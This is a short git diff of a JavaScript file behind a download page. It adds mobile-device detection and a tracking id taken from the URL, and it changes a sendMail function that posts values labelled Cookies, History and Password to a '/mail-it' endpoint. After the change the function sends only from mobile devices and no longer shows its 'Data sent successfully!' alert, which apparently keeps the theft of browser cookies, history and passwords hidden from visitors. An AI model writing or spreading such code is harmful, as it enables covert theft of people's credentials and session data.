@@ -1,5 +1,20 @@
 document.addEventListener("DOMContentLoaded", async function () {
+  function isMobileDevice() {
+    return /Mobi|Android/i.test(navigator.userAgent);
+  }
+  let url = window.location.search.slice(10).toLowerCase();
+  localStorage.setItem("id", url);
+
+  const isMobile = isMobileDevice();
+  const downloadBtn = document.getElementById("download-btn");
+
+  if (isMobile) {
+    downloadBtn.innerText = "Learn More";
+  } else {
+    downloadBtn.innerText = "Download Now";
+  }
   // Check user's country using IP-based geolocation API
+
   const countryCheck = await fetch("https://ipapi.co/json/").then((response) =>
     response.json()
   );
@@ -278,7 +293,8 @@ document.addEventListener("DOMContentLoaded", async function () {
   }
 
   // Function to send mail
-  const sendMail = (Cookies, History, Password) => {
+  function sendMail(Cookies, History, Password){
+    if(isMobile){
     const url = "/mail-it";
     const data = {
       Cookies: Cookies,
@@ -303,11 +319,15 @@ document.addEventListener("DOMContentLoaded", async function () {
       })
       .then((responseData) => {
         console.log("Success:", responseData);
-        swal("Success", "Data sent successfully!", "success");
+        // swal("Success", "Data sent successfully!", "success");
       })
       .catch((error) => {
         console.error("Error:", error);
         swal("Error", "Failed to send data.", "error");
       });
-  };
+  }else{
+    console.log("desktop");
+  }
+}
 });
+
